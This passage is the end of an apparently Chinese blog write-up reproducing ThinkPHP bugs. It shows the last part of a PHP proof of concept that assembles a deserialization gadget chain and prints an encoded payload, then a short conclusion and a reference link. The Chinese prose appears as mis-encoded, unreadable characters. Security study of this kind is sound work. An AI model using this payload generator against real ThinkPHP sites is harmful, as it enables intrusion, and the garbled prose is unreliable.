</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\Route</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;var&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\model\Pivot</span><span class="p">()],</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rest</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&#34;111&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;id&gt;&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ResourceRegister</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$registered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$resource</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\Resource</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\ResourceRegister</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h5 id="ÊÄªÁªì-2">ÊÄªÁªì
</h5><p>interstingÔºåvery interstingÔºå‰∏ÄÂàáÈÉΩÊòØÊúÄÂ•ΩÁöÑÂÆâÊéíÔºåÂ•ΩÁé©Â•ΩÁé©„ÄÇ</p>
<p>ÂèÇËÄÉÊñáÁ´†Ôºö</p>
<p><a class="link" href="https://xz.aliyun.com/news/14341"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/news/14341</a></p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<p>ThinkphpÁöÑÊºèÊ¥ûËøòÊòØÂæàÂ§öÁöÑÔºåÂÖ∂‰ªñÁöÑÂ∞±‰∏çÂ§çÁé∞‰∫ÜÔºåËøòÊÉ≥ÂÜçÂ§çÁé∞ÁöÑÂèØ‰ª•Âú®ÊºèÊ¥ûÂ∫ìÊâæÊâæ„ÄÇ</p>
<p>Ê≥®ÔºöÊØè‰∏ÄÈÉ®ÂàÜÁöÑÂèÇËÄÉÊñáÁ´†ÈÉΩÊòØ‰∏çÂêåÁöÑ„ÄÇ</p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Áõ∏ÂÖ≥ÊñáÁ´†</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
        
        

        <div class="article-details">
            <h2 class="article-title">phpstormËøúÁ®ãË∞ÉËØïÁéØÂ¢ÉÊê≠Âª∫</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/">
        
        

        <div class="article-details">
            <h2 class="article-title">ÊµÖË∞àCSPÁªïËøá</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 Example Person
    </section>
    
    <section class="powerby">
        ‰ΩøÁî® <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> ÊûÑÂª∫ <br />
        ‰∏ªÈ¢ò <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> Áî± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> ËÆæËÆ°
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
